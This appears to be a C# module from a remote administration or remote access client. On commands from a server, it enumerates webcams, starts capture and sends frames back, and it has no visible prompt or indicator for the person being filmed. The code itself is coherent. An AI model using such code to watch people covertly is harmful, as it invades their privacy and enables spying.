using AForge.Video;
using AForge.Video.DirectShow;
using Client.Packets.ClientPackets;
using Client.Packets.ServerPackets;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;

namespace Client.Controllers
{
    public static class RemoteWebcamController
    {
        public static ClientMosaic c;
        private static FilterInfoCollection videoCaptureDevices;
        private static VideoCaptureDevice finalVideo;
        public static bool needsCapture;
        public static int webcam;
        public static int quality;
        public static bool webcamStarted;

        public static void getAvailableWebcams(GetAvailableWebcams command, ClientMosaic client)
        {
            try
            {
                var deviceInfo = new Dictionary<string, List<string>>();
                var videoCaptureDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);

                foreach (FilterInfo videoCaptureDevice in videoCaptureDevices)
                {
                    List<string> supportedResolutions = new List<string>();
                    var device = new VideoCaptureDevice(videoCaptureDevice.MonikerString);
                    foreach (var resolution in device.VideoCapabilities)
                    {
                        Size frameSize = resolution.FrameSize;
                        supportedResolutions.Add(frameSize.Width.ToString() + "x" + frameSize.Height.ToString());
                    }
                    deviceInfo.Add(videoCaptureDevice.Name, supportedResolutions);
                }
                if (deviceInfo.Count > 0)
                    new GetAvailableWebcamsResponse(deviceInfo).Execute(client);
            }
            catch (Exception ex)
            {
                System.Windows.Forms.MessageBox.Show(ex.ToString());
            }
        }

        public static void getWebcam(GetWebcam command, ClientMosaic client)
        {
            c = client;
            needsCapture = true;
            webcam = command.webcam;
            quality = command.quality;
            if (!webcamStarted)
            {
                var videoCaptureDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                finalVideo = new VideoCaptureDevice(videoCaptureDevices[command.webcam].MonikerString);
                finalVideo.NewFrame += finalVideo_NewFrame;
                finalVideo.VideoResolution = finalVideo.VideoCapabilities[command.quality];
                finalVideo.Start();
                webcamStarted = true;
            }
        }

        private static void finalVideo_NewFrame(object sender, NewFrameEventArgs e)
        {
            if (!webcamStarted)
                finalVideo.Stop();

            if (needsCapture)
            {
                var image = (Bitmap)e.Frame.Clone();
                using (var stream = new MemoryStream())
                {
                    image.Save(stream, ImageFormat.Bmp);
                    new GetWebcamResponse(stream.ToArray(), webcam, quality).Execute(c);
                    stream.Close();
                }
                needsCapture = false;
            }
        }
        
        public static void stopWebcam()
        {
            finalVideo.Stop();
            webcamStarted = false;
        }
    }
}
